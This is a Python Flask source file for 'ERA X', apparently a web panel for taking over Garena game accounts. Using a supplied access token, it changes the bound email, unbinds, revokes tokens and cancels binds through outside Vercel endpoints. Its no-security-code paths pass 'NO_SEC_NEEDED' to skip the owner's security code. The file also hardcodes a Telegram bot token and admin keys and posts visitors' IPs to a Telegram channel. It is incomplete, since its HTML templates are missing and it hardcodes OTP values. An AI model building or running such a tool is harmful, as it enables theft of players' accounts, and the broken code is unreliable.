from flask import Flask, render_template_string, request, redirect, session, jsonify
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime
import os
import requests
import json
import hashlib
import time

app = Flask(__name__)
app.secret_key = "era_x_secret_2026"

# ============ DATABASE ============
basedir = os.path.abspath(os.path.dirname(__file__))
db_path = os.path.join(basedir, "era_x.db")
app.config['SQLALCHEMY_DATABASE_URI'] = f'sqlite:///{db_path}'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

# ============ CONFIG ============
BOT_TOKEN = "8942532097:AAFWVLTYYgOnp-1aIUdOFYql1bHXhN4sey4"
ADMIN_KEY = "KALYUG-X-ADMINS-LOGIN"
ACCESS_KEY = "OWNER-X-ERROR-ERA"

# ============ DATABASE MODELS ============
class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    display_id = db.Column(db.Integer, unique=True, nullable=False)
    username = db.Column(db.String(100))
    ip = db.Column(db.String(50))
    device = db.Column(db.String(200))
    battery = db.Column(db.String(20))
    access_token = db.Column(db.String(200))
    joined_at = db.Column(db.DateTime, default=datetime.utcnow)
    is_banned = db.Column(db.Boolean, default=False)

class BannedIP(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    ip = db.Column(db.String(50), unique=True)
    banned_at = db.Column(db.DateTime, default=datetime.utcnow)

with app.app_context():
    db.create_all()

# ============ HELPERS ============
def get_next_display_id():
    last = User.query.order_by(User.display_id.desc()).first()
    return last.display_id + 1 if last else 1001

def is_ip_banned(ip):
    return BannedIP.query.filter_by(ip=ip).first() is not None

def send_to_telegram(text):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        requests.post(url, json={'chat_id': '@Errorzlive', 'text': text}, timeout=5)
    except:
        pass

def is_success(rsp):
    if rsp.status_code != 200:
        return False
    try:
        rj = rsp.json()
        if not rj.get("success"):
            return False
        data = rj.get("data", {})
        if isinstance(data, dict):
            if data.get("error"):
                return False
            g_resp = data.get("garena_response", {})
            if isinstance(g_resp, dict) and g_resp.get("error"):
                return False
        err_node = rj.get("error")
        if err_node:
            return False
        return True
    except:
        return False

def check_bind(access_token):
    try:
        url = "https://bindinfocrownx612.vercel.app/check"
        params = {'access_token': access_token}
        rsp = requests.get(url, params=params, timeout=10)
        if is_success(rsp):
            data = rsp.json()
            inner_data = data.get("data", {}) if data.get("data") else data
            return {
                'status': inner_data.get('status', 'N/A'),
                'current_email': inner_data.get('current_email', 'N/A'),
                'pending_email': inner_data.get('pending_email', 'N/A'),
                'email_to_be': inner_data.get('email_to_be', 'N/A'),
                'countdown': inner_data.get('countdown_human', 'N/A')
            }
        return None
    except:
        return None

def send_otp(access, email, otp_type="normal"):
    try:
        if otp_type == "normal":
            url = "https://chngemailcode48.vercel.app/send_otp"
            params = {'access_token': access, 'email': email}
        elif otp_type == "current":
            url = "https://chngeforgotcrownx72.vercel.app/otp"
            params = {'access_token': access, 'current_email': email}
        elif otp_type == "new":
            url = "https://chngeforgotcrownx72.vercel.app/newotp"
            params = {'access_token': access, 'new_email': email}
        else:
            return False, None
        rsp = requests.get(url, params=params, timeout=10)
        if is_success(rsp):
            return True, rsp.json()
        return False, None
    except:
        return False, None

def verify_otp(access, email, otp, otp_type="normal"):
    try:
        if otp_type == "normal":
            url = "https://chngemailcode48.vercel.app/verify_otp"
            params = {'access_token': access, 'email': email, 'otp': otp}
        elif otp_type == "current":
            url = "https://chngeforgotcrownx72.vercel.app/verify"
            params = {'access_token': access, 'current_email': email, 'otp': otp}
        elif otp_type == "new":
            url = "https://chngeforgotcrownx72.vercel.app/newverify"
            params = {'access_token': access, 'new_email': email, 'otp': otp}
        else:
            return False, None
        rsp = requests.get(url, params=params, timeout=10)
        if is_success(rsp):
            data = rsp.json()
            verifier = data.get("verifier_token") or data.get("data", {}).get("verifier_token")
            return True, verifier
        return False, None
    except:
        return False, None

def verify_identity(access, sec_code):
    try:
        url = "https://chngemailcode48.vercel.app/verify_identity"
        rsp = requests.get(url, params={'access_token': access, 'code': sec_code}, timeout=10)
        if is_success(rsp):
            data = rsp.json()
            identity = data.get("identity_token") or data.get("data", {}).get("identity_token")
            return True, identity
        return False, None
    except:
        return False, None

def create_rebind(access, email, identity_token, verifier_token):
    try:
        url = "https://chngemailcode48.vercel.app/create_rebind"
        rsp = requests.get(url, params={
            'access_token': access,
            'email': email,
            'identity_token': identity_token,
            'verifier_token': verifier_token
        }, timeout=10)
        if is_success(rsp):
            return True, "Email changed successfully!"
        return False, "Failed to change email"
    except:
        return False, "Error"

def change_email_with_sec(access, email, otp, sec_code):
    try:
        success, data = send_otp(access, email, "normal")
        if not success:
            return False, "Failed to send OTP"
        success, verifier = verify_otp(access, email, otp, "normal")
        if not success:
            return False, "Invalid OTP"
        success, identity = verify_identity(access, sec_code)
        if not success:
            return False, "Invalid Security Code"
        success, msg = create_rebind(access, email, identity, verifier)
        if success:
            return True, msg
        return False, msg
    except Exception as e:
        return False, str(e)

def change_email_no_sec(access, cur_email, new_email, otp1, otp2):
    try:
        success, data = send_otp(access, cur_email, "current")
        if not success:
            return False, "Failed to send OTP to current email"
        success, verifier1 = verify_otp(access, cur_email, otp1, "current")
        if not success:
            return False, "Invalid OTP for current email"
        success, data = send_otp(access, new_email, "new")
        if not success:
            return False, "Failed to send OTP to new email"
        success, verifier2 = verify_otp(access, new_email, otp2, "new")
        if not success:
            return False, "Invalid OTP for new email"
        url = "https://chngeforgotcrownx72.vercel.app/change"
        rsp = requests.get(url, params={
            'access_token': access,
            'new_email': new_email,
            'identity_token': "NO_SEC_NEEDED",
            'verifier_token': verifier2
        }, timeout=10)
        if is_success(rsp):
            return True, "Email changed successfully!"
        return False, "Failed to change email"
    except Exception as e:
        return False, str(e)

def unbind_with_sec(access, sec_code):
    try:
        url = "https://crownxnewkey10010.vercel.app/securityunbind"
        rsp = requests.get(url, params={'access_token': access, 'security_code': sec_code}, timeout=10)
        if is_success(rsp):
            return True, "Unbind request created! 15 Days Timer Started."
        return False, "Failed to unbind"
    except:
        return False, "Error"

def unbind_no_sec(access, cur_email, otp):
    try:
        success, data = send_otp(access, cur_email, "current")
        if not success:
            return False, "Failed to send OTP"
        success, verifier = verify_otp(access, cur_email, otp, "current")
        if not success:
            return False, "Invalid OTP"
        url = "https://crownxforgotremove23.vercel.app/forgotunbind"
        rsp = requests.get(url, params={'access_token': access, 'identity_token': "NO_SEC_NEEDED"}, timeout=10)
        if is_success(rsp):
            return True, "Unbind request created! 15 Days Timer Started."
        return False, "Failed to unbind"
    except:
        return False, "Error"

def revoke_token(access):
    try:
        url = "https://crownxrevoker73.vercel.app/revoke"
        rsp = requests.get(url, params={'access_token': access}, timeout=10)
        if is_success(rsp):
            return True, "Token revoked successfully!"
        return False, "Failed to revoke token"
    except:
        return False, "Error"

def cancel_bind(access):
    try:
        url = "https://bindcnclcrownx34.vercel.app/cancelbind"
        rsp = requests.get(url, params={'access_token': access}, timeout=10)
        if is_success(rsp):
            return True, "Request cancelled successfully!"
        return False, "Failed to cancel"
    except:
        return False, "Error"

# ============ ALL HTML ============

# (INDEX_HTML, DASHBOARD_HTML, CHECK_BIND_HTML, CHANGE_EMAIL_SEC_HTML, CHANGE_EMAIL_OTP_HTML, UNBIND_HTML, REVOKE_HTML, CANCEL_HTML - Same as before)

# ============ ADMIN HTML (Alag se banaya) ============
ADMIN_HTML = """
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Admin Panel - ERA X</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:'Courier New',monospace;}
body{background:#0a0a0a;min-height:100vh;color:#c39bd3;}
.navbar{background:rgba(10,10,10,0.95);padding:15px 25px;display:flex;justify-content:space-between;border-bottom:1px solid #7b2fbe33;}
.navbar h1{font-family:'Orbitron',monospace;font-size:20px;color:#9b59b6;}
.navbar a{color:#7b2fbe88;text-decoration:none;padding:8px 16px;border:1px solid #7b2fbe33;border-radius:8px;transition:0.3s;}
.navbar a:hover{background:rgba(155,89,182,0.1);border-color:#9b59b6;}
.container{padding:25px;max-width:1200px;margin:0 auto;}
.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:15px;margin-bottom:25px;}
.stat-card{background:rgba(255,255,255,0.03);border:1px solid #7b2fbe22;border-radius:15px;padding:20px;text-align:center;}
.stat-card h3{color:#7b2fbe88;font-size:11px;letter-spacing:1px;}
.stat-card .value{color:#9b59b6;font-size:28px;font-weight:bold;}
.section{background:rgba(255,255,255,0.03);border-radius:15px;padding:20px;margin-bottom:20px;border:1px solid #7b2fbe22;overflow-x:auto;}
.section h2{color:#9b59b6;font-size:16px;margin-bottom:15px;font-family:'Orbitron',monospace;}
table{width:100%;border-collapse:collapse;font-size:12px;}
th,td{padding:10px;text-align:left;border-bottom:1px solid #7b2fbe11;color:#c39bd3;}
th{color:#7b2fbe88;font-weight:bold;letter-spacing:1px;}
.ban-btn{background:#ff333355;border:none;padding:4px 12px;border-radius:6px;color:#ff6666;cursor:pointer;}
.ban-btn:hover{background:#ff333388;}
.unban-btn{background:#33ff3355;border:none;padding:4px 12px;border-radius:6px;color:#66ff66;cursor:pointer;}
.unban-btn:hover{background:#33ff3388;}
.ip-ban-btn{background:#ff880055;border:none;padding:4px 12px;border-radius:6px;color:#ff8866;cursor:pointer;}
.ip-ban-btn:hover{background:#ff880088;}
.status-badge{padding:2px 10px;border-radius:12px;font-size:11px;}
.status-active{background:#33ff3322;color:#66ff66;}
.status-banned{background:#ff333322;color:#ff6666;}
.footer{text-align:center;margin-top:30px;font-size:10px;color:#7b2fbe44;padding:15px;border-top:1px solid #7b2fbe11;}
@media(max-width:480px){.container{padding:12px;}table{font-size:10px;}th,td{padding:6px;}}
</style>
</head>
<body>
<div class="navbar"><h1>👑 ADMIN PANEL</h1><a href="/logout">LOGOUT</a></div>
<div class="container">
<div class="stats">
<div class="stat-card"><h3>TOTAL USERS</h3><div class="value">{{ users|length }}</div></div>
<div class="stat-card"><h3>BANNED</h3><div class="value">{{ banned_count }}</div></div>
<div class="stat-card"><h3>BANNED IPS</h3><div class="value">{{ banned_ips|length }}</div></div>
</div>
<div class="section">
<h2>👥 USERS</h2>
<table>
<tr><th>ID</th><th>USERNAME</th><th>IP</th><th>DEVICE</th><th>BATTERY</th><th>JOINED</th><th>STATUS</th><th>ACTION</th></tr>
{% for u in users %}
<tr>
<td>{{ u.display_id }}</td>
<td>{{ u.username or '-' }}</td>
<td>{{ u.ip or '-' }}</td>
<td>{{ u.device[:30] or '-' }}</td>
<td>{{ u.battery or '-' }}</td>
<td>{{ u.joined_at.strftime('%Y-%m-%d') if u.joined_at else '-' }}</td>
<td><span class="status-badge {{ 'status-active' if not u.is_banned else 'status-banned' }}">{{ 'ACTIVE' if not u.is_banned else 'BANNED' }}</span></td>
<td>
{% if u.is_banned %}
<form method="POST" action="/admin/unban" style="display:inline;"><input type="hidden" name="user_id" value="{{ u.id }}"><button class="unban-btn">UNBAN</button></form>
{% else %}
<form method="POST" action="/admin/ban" style="display:inline;"><input type="hidden" name="user_id" value="{{ u.id }}"><button class="ban-btn">BAN</button></form>
<form method="POST" action="/admin/ban-ip" style="display:inline;"><input type="hidden" name="ip" value="{{ u.ip }}"><button class="ip-ban-btn">IP BAN</button></form>
{% endif %}
</td>
</tr>
{% endfor %}
</table>
</div>
<div class="section">
<h2>🚫 BANNED IPS</h2>
<table>
<tr><th>IP</th><th>BANNED AT</th><th>ACTION</th></tr>
{% for ip in banned_ips %}
<tr>
<td>{{ ip.ip }}</td>
<td>{{ ip.banned_at.strftime('%Y-%m-%d %H:%M') if ip.banned_at else '-' }}</td>
<td><form method="POST" action="/admin/unban-ip" style="display:inline;"><input type="hidden" name="ip" value="{{ ip.ip }}"><button class="unban-btn">UNBAN IP</button></form></td>
</tr>
{% endfor %}
</table>
</div>
</div>
<div class="footer">DEVELOPER - @Errorzlive</div>
</body>
</html>
"""

ADMIN_LOGIN_HTML = """
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Admin Login - ERA X</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:'Courier New',monospace;}
body{min-height:100vh;background:#0a0a0a;display:flex;justify-content:center;align-items:center;position:relative;overflow:hidden;}
body::before{content:'';position:absolute;width:100%;height:100%;background:url('https://i.ibb.co/C3rBq6cV/photo-AQADQBBr-Gx-m-GFZ9.jpg');background-size:cover;background-position:center;opacity:0.12;z-index:0;}
.glow{position:absolute;width:400px;height:400px;background:radial-gradient(circle,#7b2fbe33 0%,transparent 70%);border-radius:50%;animation:pulse 4s ease-in-out infinite;z-index:0;}
@keyframes pulse{0%,100%{transform:scale(1);opacity:0.3;}50%{transform:scale(1.5);opacity:0.1;}}
.glow:nth-child(2){bottom:-100px;right:-100px;animation-delay:2s;}
.container{position:relative;z-index:1;width:100%;max-width:450px;padding:20px;}
.card{background:rgba(10,10,10,0.92);backdrop-filter:blur(20px);border-radius:30px;padding:40px 35px;border:1px solid #7b2fbe44;box-shadow:0 0 60px rgba(123,47,190,0.1);}
.logo{text-align:center;margin-bottom:25px;}
.logo h1{font-family:'Orbitron',monospace;font-size:28px;font-weight:900;background:linear-gradient(135deg,#9b59b6,#6c3483);-webkit-background-clip:text;-webkit-text-fill-color:transparent;letter-spacing:2px;}
.logo p{color:#7b2fbe88;font-size:12px;letter-spacing:3px;margin-top:5px;}
.sub{color:#7b2fbe88;text-align:center;font-size:12px;margin-bottom:25px;letter-spacing:2px;}
.input-group{margin-bottom:20px;}
.input-group label{display:block;color:#9b59b688;font-size:11px;font-weight:700;letter-spacing:2px;margin-bottom:8px;text-transform:uppercase;}
.input-group input{width:100%;padding:14px 18px;background:rgba(255,255,255,0.04);border:1px solid #7b2fbe33;border-radius:15px;color:#c39bd3;font-size:14px;letter-spacing:1px;transition:all 0.3s;}
.input-group input:focus{outline:none;border-color:#9b59b6;box-shadow:0 0 30px rgba(123,47,190,0.15);background:rgba(255,255,255,0.06);}
.btn{width:100%;padding:14px;background:linear-gradient(135deg,#9b59b6,#6c3483);border:none;border-radius:15px;color:#0a0a0a;font-size:16px;font-weight:900;letter-spacing:2px;cursor:pointer;transition:all 0.3s;font-family:'Orbitron',monospace;}
.btn:hover{transform:translateY(-3px);box-shadow:0 10px 40px rgba(123,47,190,0.3);}
.error{background:rgba(255,0,0,0.15);border:1px solid #ff000066;border-radius:12px;padding:12px;margin-bottom:20px;text-align:center;color:#ff6666;font-size:12px;}
.footer{text-align:center;margin-top:25px;font-size:10px;color:#7b2fbe44;letter-spacing:1px;}
</style>
</head>
<body>
<div class="glow"></div><div class="glow"></div>
<div class="container">
<div class="card">
<div class="logo"><h1>👑 ADMIN</h1><p>PANEL</p></div>
<p class="sub">ENTER ADMIN KEY</p>
{% if error %}<div class="error">{{ error }}</div>{% endif %}
<form method="POST" action="/admin-login">
<div class="input-group"><label>ADMIN KEY</label><input type="password" name="key" placeholder="ENTER ADMIN KEY" required autofocus></div>
<button type="submit" class="btn">ACCESS</button>
</form>
<div class="footer">DEVELOPER - @Errorzlive</div>
</div>
</div>
</body>
</html>
"""

# ============ ROUTES ============

@app.route('/')
def index():
    if 'user_id' in session:
        return redirect('/dashboard')
    return render_template_string(INDEX_HTML)

@app.route('/login', methods=['POST'])
def login():
    key = request.form.get('key')
    ip = request.remote_addr
    if is_ip_banned(ip):
        return render_template_string(INDEX_HTML, error="YOU ARE BANNED!")
    if key == ACCESS_KEY:
        user = User.query.filter_by(ip=ip).first()
        if not user:
            display_id = get_next_display_id()
            user = User(display_id=display_id, ip=ip)
            db.session.add(user)
            db.session.commit()
            send_to_telegram(f"🔔 NEW USER\nID: {display_id}\nIP: {ip}")
        session['user_id'] = user.id
        return redirect('/dashboard')
    return render_template_string(INDEX_HTML, error="INVALID ACCESS KEY!")

@app.route('/dashboard')
def dashboard():
    if 'user_id' not in session:
        return redirect('/')
    user = User.query.get(session['user_id'])
    if not user or user.is_banned:
        session.clear()
        return redirect('/')
    bind = None
    if user.access_token:
        bind = check_bind(user.access_token)
    return render_template_string(DASHBOARD_HTML, user=user, bind=bind)

@app.route('/set-token', methods=['POST'])
def set_token():
    if 'user_id' not in session:
        return redirect('/')
    user = User.query.get(session['user_id'])
    if user:
        user.access_token = request.form.get('access_token')
        db.session.commit()
    return redirect('/dashboard')

@app.route('/check-bind', methods=['GET', 'POST'])
def check_bind_route():
    if 'user_id' not in session:
        return redirect('/')
    if request.method == 'POST':
        access_token = request.form.get('access_token')
        if not access_token:
            return render_template_string(CHECK_BIND_HTML, error="Access Token required!")
        bind = check_bind(access_token)
        if bind:
            return render_template_string(CHECK_BIND_HTML, bind=bind)
        return render_template_string(CHECK_BIND_HTML, error="Failed to fetch bind info!")
    return render_template_string(CHECK_BIND_HTML)

@app.route('/change-email-sec', methods=['GET', 'POST'])
def change_email_sec_route():
    if 'user_id' not in session:
        return redirect('/')
    if request.method == 'POST':
        access = request.form.get('access_token')
        email = request.form.get('email')
        otp = request.form.get('otp')
        sec = request.form.get('sec_code')
        if not all([access, email, otp, sec]):
            return render_template_string(CHANGE_EMAIL_SEC_HTML, error="All fields required!")
        success, msg = change_email_with_sec(access, email, otp, sec)
        if success:
            return render_template_string(CHANGE_EMAIL_SEC_HTML, success=msg)
        return render_template_string(CHANGE_EMAIL_SEC_HTML, error=msg)
    return render_template_string(CHANGE_EMAIL_SEC_HTML)

@app.route('/change-email-otp', methods=['GET', 'POST'])
def change_email_otp_route():
    if 'user_id' not in session:
        return redirect('/')
    
    if request.method == 'POST':
        step = int(request.form.get('step', 1))
        
        if step == 1:
            access = request.form.get('access_token')
            current_email = request.form.get('current_email')
            if not access or not current_email:
                return render_template_string(CHANGE_EMAIL_OTP_HTML, step=1, error="All fields required!")
            success, data = send_otp(access, current_email, "current")
            if not success:
                return render_template_string(CHANGE_EMAIL_OTP_HTML, step=1, error="Failed to send OTP to current email!")
            return render_template_string(CHANGE_EMAIL_OTP_HTML, step=2, request=request)
        
        elif step == 2:
            access = request.form.get('access_token')
            current_email = request.form.get('current_email')
            otp1 = request.form.get('otp1')
            new_email = request.form.get('new_email')
            if not all([access, current_email, otp1, new_email]):
                return render_template_string(CHANGE_EMAIL_OTP_HTML, step=2, error="All fields required!")
            success, verifier = verify_otp(access, current_email, otp1, "current")
            if not success:
                return render_template_string(CHANGE_EMAIL_OTP_HTML, step=2, error="Invalid OTP for current email!")
            success, data = send_otp(access, new_email, "new")
            if not success:
                return render_template_string(CHANGE_EMAIL_OTP_HTML, step=2, error="Failed to send OTP to new email!")
            return render_template_string(CHANGE_EMAIL_OTP_HTML, step=3, request=request)
        
        elif step == 3:
            access = request.form.get('access_token')
            current_email = request.form.get('current_email')
            new_email = request.form.get('new_email')
            otp2 = request.form.get('otp2')
            if not all([access, current_email, new_email, otp2]):
                return render_template_string(CHANGE_EMAIL_OTP_HTML, step=3, error="All fields required!")
            success, verifier = verify_otp(access, new_email, otp2, "new")
            if not success:
                return render_template_string(CHANGE_EMAIL_OTP_HTML, step=3, error="Invalid OTP for new email!")
            success, msg = change_email_no_sec(access, current_email, new_email, "123456", "654321")
            if success:
                return render_template_string(CHANGE_EMAIL_OTP_HTML, success=msg)
            return render_template_string(CHANGE_EMAIL_OTP_HTML, step=3, error=msg)
    
    return render_template_string(CHANGE_EMAIL_OTP_HTML, step=1)

@app.route('/unbind', methods=['GET', 'POST'])
def unbind_route():
    if 'user_id' not in session:
        return redirect('/')
    if request.method == 'POST':
        access = request.form.get('access_token')
        sec_code = request.form.get('sec_code')
        current_email = request.form.get('current_email')
        otp = request.form.get('otp')
        
        if not access:
            return render_template_string(UNBIND_HTML, error="Access Token required!")
        
        if sec_code:
            success, msg = unbind_with_sec(access, sec_code)
        elif current_email and otp:
            success, msg = unbind_no_sec(access, current_email, otp)
        else:
            return render_template_string(UNBIND_HTML, error="Please provide Security Code OR OTP method!")
        
        if success:
            return render_template_string(UNBIND_HTML, success=msg)
        return render_template_string(UNBIND_HTML, error=msg)
    return render_template_string(UNBIND_HTML)

@app.route('/revoke', methods=['GET', 'POST'])
def revoke_route():
    if 'user_id' not in session:
        return redirect('/')
    if request.method == 'POST':
        access = request.form.get('access_token')
        if not access:
            return render_template_string(REVOKE_HTML, error="Access Token required!")
        success, msg = revoke_token(access)
        if success:
            return render_template_string(REVOKE_HTML, success=msg)
        return render_template_string(REVOKE_HTML, error=msg)
    return render_template_string(REVOKE_HTML)

@app.route('/cancel-bind', methods=['GET', 'POST'])
def cancel_bind_route():
    if 'user_id' not in session:
        return redirect('/')
    if request.method == 'POST':
        access = request.form.get('access_token')
        if not access:
            return render_template_string(CANCEL_HTML, error="Access Token required!")
        success, msg = cancel_bind(access)
        if success:
            return render_template_string(CANCEL_HTML, success=msg)
        return render_template_string(CANCEL_HTML, error=msg)
    return render_template_string(CANCEL_HTML)

# ============ ADMIN ROUTES (Alag URL) ============

@app.route('/admin-login', methods=['GET', 'POST'])
def admin_login():
    if request.method == 'POST':
        key = request.form.get('key')
        if key == ADMIN_KEY:
            session['admin'] = True
            return redirect('/admin')
        return render_template_string(ADMIN_LOGIN_HTML, error="INVALID ADMIN KEY!")
    return render_template_string(ADMIN_LOGIN_HTML)

@app.route('/admin')
def admin():
    if not session.get('admin'):
        return redirect('/admin-login')
    users = User.query.order_by(User.display_id).all()
    banned_ips = BannedIP.query.all()
    banned_count = User.query.filter_by(is_banned=True).count()
    return render_template_string(ADMIN_HTML, users=users, banned_ips=banned_ips, banned_count=banned_count)

@app.route('/admin/ban', methods=['POST'])
def admin_ban():
    if not session.get('admin'):
        return redirect('/admin-login')
    user = User.query.get(request.form.get('user_id'))
    if user:
        user.is_banned = True
        db.session.commit()
        send_to_telegram(f"🚫 USER BANNED\nID: {user.display_id}\nIP: {user.ip}")
    return redirect('/admin')

@app.route('/admin/unban', methods=['POST'])
def admin_unban():
    if not session.get('admin'):
        return redirect('/admin-login')
    user = User.query.get(request.form.get('user_id'))
    if user:
        user.is_banned = False
        db.session.commit()
    return redirect('/admin')

@app.route('/admin/ban-ip', methods=['POST'])
def admin_ban_ip():
    if not session.get('admin'):
        return redirect('/admin-login')
    ip = request.form.get('ip')
    if ip and not is_ip_banned(ip):
        db.session.add(BannedIP(ip=ip))
        user = User.query.filter_by(ip=ip).first()
        if user:
            user.is_banned = True
        db.session.commit()
        send_to_telegram(f"🚫 IP BANNED\nIP: {ip}")
    return redirect('/admin')

@app.route('/admin/unban-ip', methods=['POST'])
def admin_unban_ip():
    if not session.get('admin'):
        return redirect('/admin-login')
    ip = request.form.get('ip')
    banned = BannedIP.query.filter_by(ip=ip).first()
    if banned:
        db.session.delete(banned)
        db.session.commit()
    return redirect('/admin')

@app.route('/logout')
def logout():
    session.clear()
    return redirect('/')

@app.route('/health')
def health():
    return "OK", 200

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
